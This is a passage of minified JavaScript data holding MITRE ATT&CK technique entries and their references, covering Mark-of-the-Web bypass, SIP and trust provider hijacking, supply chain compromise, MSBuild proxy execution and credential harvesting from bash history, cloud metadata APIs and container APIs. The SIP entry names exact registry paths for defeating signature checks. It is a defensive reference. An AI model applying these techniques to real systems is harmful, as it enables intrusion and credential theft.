install a malicious certificate as a trusted root certificate into the system keychain. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fobjective-see.com\u002Fblog\u002Fblog_0x26.html'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";FD.external_references=[{source_name:b,external_id:FE,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1553\u002F004"},{external_id:"CAPEC-479",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F479.html"},{url:"https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FRoot_certificate",description:"Wikipedia. (2016, December 6). Root certificate. Retrieved February 20, 2017.",source_name:"Wikipedia Root Certificate"},{url:FF,description:FG,source_name:FH},{url:"https:\u002F\u002Fwww.kaspersky.com\u002Fblog\u002Flenovo-pc-with-adware-superfish-preinstalled\u002F7712\u002F",description:"Onuma. (2015, February 24). Superfish: Adware Preinstalled on Lenovo Laptops. Retrieved February 20, 2017.",source_name:"Kaspersky Superfish"},{url:Fu,description:Fv,source_name:Fw},{url:"https:\u002F\u002Fobjective-see.com\u002Fblog\u002Fblog_0x26.html",description:"Patrick Wardle. (2018, January 11). Ay MaMi. Retrieved March 19, 2018.",source_name:"objective-see ay mami 2018"},{url:"https:\u002F\u002Fdocs.microsoft.com\u002Fsysinternals\u002Fdownloads\u002Fsigcheck",description:"Russinovich, M. et al.. (2017, May 22). Sigcheck. Retrieved April 3, 2018.",source_name:"Microsoft Sigcheck May 2017"},{url:"https:\u002F\u002Fwww.tripwire.com\u002Fstate-of-security\u002Foff-topic\u002Fappunblocker-bypassing-applocker\u002F",description:"Smith, T. (2016, October 27). AppUNBlocker: Bypassing AppLocker. Retrieved December 19, 2017.",source_name:"Tripwire AppUNBlocker"}];FD["subtechnique-of"]=ae;FI.id=FJ;FI["object-type"]=a;FI.name="Mark-of-the-Web Bypass";FI.description="Adversaries may abuse specific file formats to subvert Mark-of-the-Web (MOTW) controls. In Windows, when files are downloaded from the Internet, they are tagged with a hidden NTFS Alternate Data Stream (ADS) named \u003Ccode\u003EZone.Identifier\u003C\u002Fcode\u003E with a specific value known as the MOTW.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fopenspecs\u002Fwindows_protocols\u002Fms-fscc\u002F6e3f7352-d11c-4d76-8c39-2516a9df36e8'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Files that are tagged with MOTW are protected and cannot perform certain actions. For example, starting in MS Office 10, if a MS Office file has the MOTW, it will open in Protected View. Executables tagged with the MOTW will be processed by Windows Defender SmartScreen that compares files with an allowlist of well-known executables. If the file in not known\u002Ftrusted, SmartScreen will prevent the execution and warn the user not to run it.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmedium.com\u002Fswlh\u002Finvestigating-the-use-of-vhd-files-by-cybercriminals-3f1f08304316'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Foutflank.nl\u002Fblog\u002F2020\u002F03\u002F30\u002Fmark-of-the-web-from-a-red-teams-perspective\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.intezer.com\u002Fblog\u002Fresearch\u002Frussian-apt-uses-covid-19-lures-to-deliver-zebrocy\u002F'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may abuse container files such as compressed\u002Farchive (.arj, .gzip) and\u002For disk image (.iso, .vhd) file formats to deliver malicious payloads that may not be tagged with MOTW. Container files downloaded from the Internet will be marked with MOTW but the files within may not inherit the MOTW after the container files are extracted and\u002For mounted. MOTW is a NTFS feature and many container files do not support NTFS alternative data streams. After a container file is extracted and\u002For mounted, the files contained within them may be treated as local files on disk and run without protections.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmedium.com\u002Fswlh\u002Finvestigating-the-use-of-vhd-files-by-cybercriminals-3f1f08304316'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Foutflank.nl\u002Fblog\u002F2020\u002F03\u002F30\u002Fmark-of-the-web-from-a-red-teams-perspective\u002F'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";FI.external_references=[{source_name:b,external_id:FJ,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1553\u002F005"},{source_name:"Microsoft Zone.Identifier 2020",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fopenspecs\u002Fwindows_protocols\u002Fms-fscc\u002F6e3f7352-d11c-4d76-8c39-2516a9df36e8",description:"Microsoft. (2020, August 31). Zone.Identifier Stream Name. Retrieved February 22, 2021."},{source_name:"Beek Use of VHD Dec 2020",url:"https:\u002F\u002Fmedium.com\u002Fswlh\u002Finvestigating-the-use-of-vhd-files-by-cybercriminals-3f1f08304316",description:"Beek, C. (2020, December 3). Investigating the Use of VHD Files By Cybercriminals. Retrieved February 22, 2021."},{source_name:"Outflank MotW 2020",url:"https:\u002F\u002Foutflank.nl\u002Fblog\u002F2020\u002F03\u002F30\u002Fmark-of-the-web-from-a-red-teams-perspective\u002F",description:"Hegt, S. (2020, March 30). Mark-of-the-Web from a red team’s perspective. Retrieved February 22, 2021."},{source_name:"Intezer Russian APT Dec 2020",url:"https:\u002F\u002Fwww.intezer.com\u002Fblog\u002Fresearch\u002Frussian-apt-uses-covid-19-lures-to-deliver-zebrocy\u002F",description:"Kennedy, J. (2020, December 9). A Zebra in Gopher's Clothing: Russian APT Uses COVID-19 Lures to Deliver Zebrocy. Retrieved February 22, 2021."}];FI["subtechnique-of"]=ae;FK.id=FL;FK["object-type"]=a;FK.name="SIP and Trust Provider Hijacking";FK.description="Adversaries may tamper with SIP and trust provider components to mislead the operating system and application control tools when conducting signature validation checks. In user mode, Windows Authenticode \u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fms537359.aspx'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function,  \u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fwindows\u002Fdesktop\u002Faa388208.aspx'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fspecterops.io\u002Fassets\u002Fresources\u002FSpecterOps_Subverting_Trust_in_Windows.pdf'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nBecause of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs) \u003Csup\u003E\u003Ca href='https:\u002F\u002Fblogs.technet.microsoft.com\u002Feduardonavarro\u002F2008\u002F07\u002F11\u002Fsips-subject-interface-package-and-authenticode\u002F'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E to provide a layer of abstraction between API functions and files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all  \u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fwindows-hardware\u002Fdrivers\u002Finstall\u002Fcatalog-files'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E) and are identified by globally unique identifiers (GUIDs). \u003Csup\u003E\u003Ca href='https:\u002F\u002Fspecterops.io\u002Fassets\u002Fresources\u002FSpecterOps_Subverting_Trust_in_Windows.pdf'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nSimilar to \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1553\u002F002'\u003ECode Signing\u003C\u002Fa\u003E, adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and application control tools to classify malicious (or any) code as signed by: \u003Csup\u003E\u003Ca href='https:\u002F\u002Fspecterops.io\u002Fassets\u002Fresources\u002FSpecterOps_Subverting_Trust_in_Windows.pdf'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\n* Modifying the \u003Ccode\u003EDll\u003C\u002Fcode\u003E and \u003Ccode\u003EFuncName\u003C\u002Fcode\u003E Registry values in \u003Ccode\u003EHKLM\\SOFTWARE[\\WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllGetSignedDataMsg\\{SIP_GUID}\u003C\u002Fcode\u003E that point to the dynamic link library (DLL) providing a SIP’s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file. By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the file’s real signature, an adversary can apply an acceptable signature value to all files using that SIP \u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002Fmattifestation\u002FPoCSubjectInterfacePackage'\u003E[8]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E (although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file).\n* Modifying the \u003Ccode\u003EDll\u003C\u002Fcode\u003E and \u003Ccode\u003EFuncName\u003C\u002Fcode\u003E Registry values in \u003Ccode\u003EHKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{SIP_GUID}\u003C\u002Fcode\u003E that point to the DLL providing a SIP’s CryptSIPDllVerifyIndirectData function, which validates a file’s computed hash against the signed hash value. By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP \u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002Fmattifestation\u002FPoCSubjectInterfacePackage'\u003E[9]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E (with or without hijacking the previously mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk.\n* Modifying the \u003Ccode\u003EDLL\u003C\u002Fcode\u003E and \u003Ccode\u003EFunction\u003C\u002Fcode\u003E Registry values in \u003Ccode\u003EHKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy\\{trust provider GUID}\u003C\u002Fcode\u003E that point to the DLL providing a trust provider’s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made. Similar to hijacking SIP’s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex).\n* **Note:** The above hijacks are also possible without modifying the Registry via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1574\u002F001'\u003EDLL Search Order Hijacking\u003C\u002Fa\u003E.\n\nHijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fspecterops.io\u002Fassets\u002Fresources\u002FSpecterOps_Subverting_Trust_in_Windows.pdf'\u003E[10]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";FK.external_references=[{source_name:b,external_id:FL,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1553\u002F003"},{url:"https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fms537359.aspx",description:"Microsoft. (n.d.). Authenticode. Retrieved January 31, 2018.",source_name:"Microsoft Authenticode"},{url:"https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fwindows\u002Fdesktop\u002Faa388208.aspx",description:"Microsoft. (n.d.). WinVerifyTrust function. Retrieved January 31, 2018.",source_name:"Microsoft WinVerifyTrust"},{url:Fl,description:Fm,source_name:Fn},{url:"https:\u002F\u002Fblogs.technet.microsoft.com\u002Feduardonavarro\u002F2008\u002F07\u002F11\u002Fsips-subject-interface-package-and-authenticode\u002F",description:"Navarro, E. (2008, July 11). SIP’s (Subject Interface Package) and Authenticode. Retrieved January 31, 2018.",source_name:"EduardosBlog SIPs July 2008"},{url:"https:\u002F\u002Fdocs.microsoft.com\u002Fwindows-hardware\u002Fdrivers\u002Finstall\u002Fcatalog-files",description:"Hudek, T. (2017, April 20). Catalog Files and Digital Signatures. Retrieved January 31, 2018.",source_name:"Microsoft Catalog Files and Signatures April 2017"},{url:"https:\u002F\u002Fgithub.com\u002Fmattifestation\u002FPoCSubjectInterfacePackage",description:"Graeber, M. (2017, September 14). PoCSubjectInterfacePackage. Retrieved January 31, 2018.",source_name:"GitHub SIP POC Sept 2017"},{url:"http:\u002F\u002Fwww.entrust.net\u002Fknowledge-base\u002Ftechnote.cfm?tn=8165",description:"Entrust Datacard. (2017, August 16). How do I enable CAPI 2.0 logging in Windows Vista, Windows 7 and Windows 2008 Server?. Retrieved January 31, 2018.",source_name:"Entrust Enable CAPI2 Aug 2017"},{url:"https:\u002F\u002Fdocs.microsoft.com\u002Fprevious-versions\u002Fwindows\u002Fit-pro\u002Fwindows-server-2012-R2-and-2012\u002Fdn311461(v=ws.11)",description:"Microsoft. (2016, August 31). Registry (Global Object Access Auditing). Retrieved January 31, 2018.",source_name:"Microsoft Registry Auditing Aug 2016"},{url:"https:\u002F\u002Fdocs.microsoft.com\u002Fprevious-versions\u002Fwindows\u002Fit-pro\u002Fwindows-server-2008-R2-and-2008\u002Fdd941614(v=ws.10)",description:"Microsoft. (2012, July 2). Audit Registry. Retrieved January 31, 2018.",source_name:"Microsoft Audit Registry July 2012"}];FK["subtechnique-of"]=ae;FV.id=FW;FV["object-type"]=a;FV.name="Compromise Hardware Supply Chain";FV.description="Adversaries may manipulate hardware components in products prior to receipt by a final consumer for the purpose of data or system compromise. By modifying hardware or firmware in the supply chain, adversaries can insert a backdoor into consumer networks that may be difficult to detect and give the adversary a high degree of control over the system. Hardware backdoors may be inserted into various devices, such as servers, workstations, network infrastructure, or peripherals.";FV.external_references=[{source_name:b,external_id:FW,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1195\u002F003"}];FV["subtechnique-of"]=bU;FX.id=FY;FX["object-type"]=a;FX.name="Compromise Software Dependencies and Development Tools";FX.description="Adversaries may manipulate software dependencies and development tools prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.trendmicro.com\u002Fvinfo\u002Fdk\u002Fsecurity\u002Fnews\u002Fcybercrime-and-digital-threats\u002Fhacker-infects-node-js-package-to-steal-from-bitcoin-wallets'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E  \n\nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims. ";FX.external_references=[{source_name:b,external_id:FY,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1195\u002F001"},{source_name:FS,url:FT,description:FU}];FX["subtechnique-of"]=bU;FZ.id=F_;FZ["object-type"]=a;FZ.name="Compromise Software Supply Chain";FZ.description="Adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update\u002Fdistribution mechanism for that software, or replacing compiled releases with a modified version.\n\nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.avast.com\u002Fnew-investigations-in-ccleaner-incident-point-to-a-possible-third-stage-that-had-keylogger-capacities'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.commandfive.com\u002Fpapers\u002FC5_APT_SKHack.pdf'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E  ";FZ.external_references=[{source_name:b,external_id:F_,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1195\u002F002"},{url:FM,description:FN,source_name:FO},{url:FP,description:FQ,source_name:FR}];FZ["subtechnique-of"]=bU;Gb.id=Gc;Gb["object-type"]=a;Gb.name="Internet Connection Discovery";Gb.description="Adversaries may check for Internet connectivity on compromised systems. This may be performed during automated discovery and can be accomplished in numerous ways such as using \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0097'\u003EPing\u003C\u002Fa\u003E, \u003Ccode\u003Etracert\u003C\u002Fcode\u003E, and GET requests to websites.\n\nAdversaries may use the results and responses from these requests to determine if the system is capable of communicating with their C2 servers before attempting to connect to them. The results may also be used to identify routes, redirectors, and proxy servers.";Gb.external_references=[{source_name:b,external_id:Gc,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1016\u002F001"}];Gb["subtechnique-of"]=gD;Gg.id=Gh;Gg["object-type"]=a;Gg.name="Launchctl";Gg.description="Adversaries may abuse launchctl to execute commands or programs. Launchctl controls the macOS launchd process, which handles things like \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1543\u002F001'\u003ELaunch Agent\u003C\u002Fa\u003Es and \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1543\u002F004'\u003ELaunch Daemon\u003C\u002Fa\u003Es, but can execute other commands or programs itself. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fss64.com\u002Fosx\u002Flaunchctl.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nBy loading or reloading \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1543\u002F001'\u003ELaunch Agent\u003C\u002Fa\u003Es or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1543\u002F004'\u003ELaunch Daemon\u003C\u002Fa\u003Es, adversaries can install persistence or execute changes they made.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fresearchcenter.paloaltonetworks.com\u002F2016\u002F09\u002Funit42-sofacys-komplex-os-x-trojan\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nRunning a command from launchctl is as simple as \u003Ccode\u003Elaunchctl submit -l \u003ClabelName\u003E -- \u002FPath\u002Fto\u002Fthing\u002Fto\u002Fexecute \"arg\" \"arg\" \"arg\"\u003C\u002Fcode\u003E. Adversaries can abuse this functionality to execute code or even bypass application control if launchctl is an allowed process.";Gg.external_references=[{source_name:b,external_id:Gh,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1569\u002F001"},{source_name:"Launchctl Man",url:"https:\u002F\u002Fss64.com\u002Fosx\u002Flaunchctl.html",description:"SS64. (n.d.). launchctl. Retrieved March 28, 2020."},{url:bl,description:bm,source_name:bn}];Gg["subtechnique-of"]=dv;Gi.id=Gj;Gi["object-type"]=a;Gi.name="Service Execution";Gi.description="Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (\u003Ccode\u003Eservices.exe\u003C\u002Fcode\u003E) is an interface to manage and manipulate services.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fwindows\u002Fwin32\u002Fservices\u002Fservice-control-manager'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E The service control manager is accessible to users via GUI components as well as system utilities such as \u003Ccode\u003Esc.exe\u003C\u002Fcode\u003E and \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0039'\u003ENet\u003C\u002Fa\u003E.\n\n\u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0029'\u003EPsExec\u003C\u002Fa\u003E can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API.\u003Csup\u003E\u003Ca href='https:\u002F\u002Ftechnet.microsoft.com\u002Fen-us\u002Fsysinternals\u002Fbb897553.aspx'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1543\u002F003'\u003EWindows Service\u003C\u002Fa\u003E during service persistence or privilege escalation.";Gi.external_references=[{source_name:b,external_id:Gj,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1569\u002F002"},{source_name:"Microsoft Service Control Manager",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fwindows\u002Fwin32\u002Fservices\u002Fservice-control-manager",description:"Microsoft. (2018, May 31). Service Control Manager. Retrieved March 28, 2020."},{url:"https:\u002F\u002Ftechnet.microsoft.com\u002Fen-us\u002Fsysinternals\u002Fbb897553.aspx",description:"Russinovich, M. (2014, May 2). Windows Sysinternals PsExec v2.11. Retrieved May 13, 2015.",source_name:"Russinovich Sysinternals"}];Gi["subtechnique-of"]=dv;Gr.id=Gs;Gr["object-type"]=a;Gr.name="Port Knocking";Gr.description="Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.\n\nThis technique has been observed to both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.\n\nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.giac.org\u002Fpaper\u002Fgcih\u002F342\u002Fhandle-cd00r-invisible-backdoor\u002F103631'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E, is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.";Gr.external_references=[{source_name:b,external_id:Gs,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1205\u002F001"},{url:Go,description:Gp,source_name:Gq}];Gr["subtechnique-of"]=gE;Gu.id=Gv;Gu["object-type"]=a;Gu.name="MSBuild";Gu.description="Adversaries may use MSBuild to proxy execution of code through a trusted Windows utility. MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It handles XML formatted project files that define requirements for loading and building various platforms and configurations.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fdd393574.aspx'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries can abuse MSBuild to proxy execution of malicious code. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# or Visual Basic code to be inserted into an XML project file.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fdd393574.aspx'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fvisualstudio\u002Fmsbuild\u002Fmsbuild-inline-tasks?view=vs-2019#code-element'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application control defenses that are configured to allow MSBuild.exe execution.\u003Csup\u003E\u003Ca href='https:\u002F\u002Flolbas-project.github.io\u002Flolbas\u002FBinaries\u002FMsbuild\u002F'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";Gu.external_references=[{source_name:b,external_id:Gv,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1127\u002F001"},{url:"https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fdd393574.aspx",description:"Microsoft. (n.d.). MSBuild1. Retrieved November 30, 2016.",source_name:"MSDN MSBuild"},{source_name:"Microsoft MSBuild Inline Tasks 2017",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fvisualstudio\u002Fmsbuild\u002Fmsbuild-inline-tasks?view=vs-2019#code-element",description:"Microsoft. (2017, September 21). MSBuild inline tasks. Retrieved March 5, 2021."},{source_name:"LOLBAS Msbuild",url:"https:\u002F\u002Flolbas-project.github.io\u002Flolbas\u002FBinaries\u002FMsbuild\u002F",description:"LOLBAS. (n.d.). Msbuild.exe. Retrieved July 31, 2019."}];Gu["subtechnique-of"]=gF;Gy.id=Gz;Gy["object-type"]=a;Gy.name="Bash History";Gy.description="Adversaries may search the bash command history on compromised systems for insecurely stored credentials. Bash keeps track of the commands users type on the command-line with the \"history\" utility. Once a user logs out, the history is flushed to the user’s \u003Ccode\u003E.bash_history\u003C\u002Fcode\u003E file. For each user, this file resides at the same location: \u003Ccode\u003E~\u002F.bash_history\u003C\u002Fcode\u003E. Typically, this file keeps track of the user’s last 500 commands. Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out. Attackers can abuse this by looking through the file for potential credentials. \u003Csup\u003E\u003Ca href='http:\u002F\u002Fwww.slideshare.net\u002FStephanBorosh\u002Fexternal-to-da-the-os-x-way'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";Gy.external_references=[{source_name:b,external_id:Gz,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1552\u002F003"},{url:eM,description:eN,source_name:eO}];Gy["subtechnique-of"]=X;GA.id=GB;GA["object-type"]=a;GA.name="Cloud Instance Metadata API";GA.description="Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.\n\nMost cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.aws.amazon.com\u002FAWSEC2\u002Flatest\u002FUserGuide\u002Fec2-instance-metadata.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E A cloud metadata API has been used in at least one high profile compromise.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fkrebsonsecurity.com\u002F2019\u002F08\u002Fwhat-we-can-learn-from-the-capital-one-hack\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nIf adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, attackers may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows the attacker to gain access to the sensitive information via a request to the Instance Metadata API.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fredlock.io\u002Fblog\u002Finstance-metadata-api-a-modern-day-trojan-horse'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nThe de facto standard across cloud service providers is to host the Instance Metadata API at \u003Ccode\u003Ehttp[:]\u002F\u002F169.254.169.254\u003C\u002Fcode\u003E.\n";GA.external_references=[{source_name:b,external_id:GB,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1552\u002F005"},{source_name:"AWS Instance Metadata API",url:"https:\u002F\u002Fdocs.aws.amazon.com\u002FAWSEC2\u002Flatest\u002FUserGuide\u002Fec2-instance-metadata.html",description:"AWS. (n.d.). Instance Metadata and User Data. Retrieved July 18, 2019."},{source_name:"Krebs Capital One August 2019",url:"https:\u002F\u002Fkrebsonsecurity.com\u002F2019\u002F08\u002Fwhat-we-can-learn-from-the-capital-one-hack\u002F",description:"Krebs, B.. (2019, August 19). What We Can Learn from the Capital One Hack. Retrieved March 25, 2020."},{description:"Higashi, Michael. (2018, May 15). Instance Metadata API: A Modern Day Trojan Horse. Retrieved July 16, 2019.",url:"https:\u002F\u002Fredlock.io\u002Fblog\u002Finstance-metadata-api-a-modern-day-trojan-horse",source_name:"RedLock Instance Metadata API 2018"}];GA["subtechnique-of"]=X;GC.id=GD;GC["object-type"]=a;GC.name="Container API";GC.description="Adversaries may gather credentials via APIs within a containers environment. APIs in these environments, such as the Docker API and Kubernetes APIs, allow a user to remotely manage their container resources and cluster components.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.docker.com\u002Fengine\u002Fapi\u002Fv1.41\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fkubernetes.io\u002Fdocs\u002Fconcepts\u002Foverview\u002Fkubernetes-api\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAn adversary may access the Docker API to collect logs that contain credentials to cloud, container, and various other resources in the environment.\u003Csup\u003E\u003Ca href='https:\u002F\u002Funit42.paloaltonetworks.com\u002Fattackers-tactics-and-techniques-in-unsecured-docker-daemons-revealed\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E An adversary with sufficient permissions, such as via a pod's service account, may also use the Kubernetes API to retrieve credentials from the Kubernetes API server. These credentials may include those needed for Docker API authentication or secrets from Kubernetes cluster components. ";GC.external_references=[{source_name:b,external_id:GD,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1552\u002F007"},{source_name:nm,url:nn,description:no},{source_name:ez,url:eA,description:eB},{source_name:GE,url:GF,description:GG}];GC["subtechnique-of"]=X;GH.id=GI;GH["object-type"]=a;GH.name="Credentials In Files";GH.description="Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared 